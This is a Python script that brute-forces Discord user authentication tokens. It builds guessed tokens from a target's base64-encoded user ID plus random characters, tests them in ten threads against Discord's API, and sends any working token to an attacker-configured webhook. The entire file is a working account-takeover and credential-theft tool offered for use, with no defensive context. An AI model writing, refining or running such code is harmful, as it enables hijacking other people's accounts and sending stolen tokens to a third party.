import base64
import requests
import threading
import random
import time
from dhooks import Webhook
hook = Webhook('YOUR WEBHOOK') # enter your discord webhook
random = random.SystemRandom()
num_thread = int("10") # threads can be changed       
idd = input("input id: ")    
message_bytes = idd.encode('ascii')    
base64_bytes = base64.b64encode(message_bytes)  
first_half = base64_bytes.decode('ascii')   
def force(): 
    while True:
        middle = ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-') for _ in range(6))
        ende = ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-') for _ in range(27))
        token = f"{first_half}.{middle}.{ende}"
    
        
        headers = {'Content-Type': 'application/json', 'authorization': token}
        url = "https://discordapp.com/api/v6/users/@me/library"
        r = requests.get(url, headers=headers)
        print(r.status_code)
        if r.status_code == 200:
            hook.send(f"brute for id {idd} was successful {token}")
            break
        elif r.status_code == 429:
            time.sleep(20)
        else:
        
            pass
    
               
for i in range(num_thread):
    t = threading.Thread(target=force)
    t.start()      
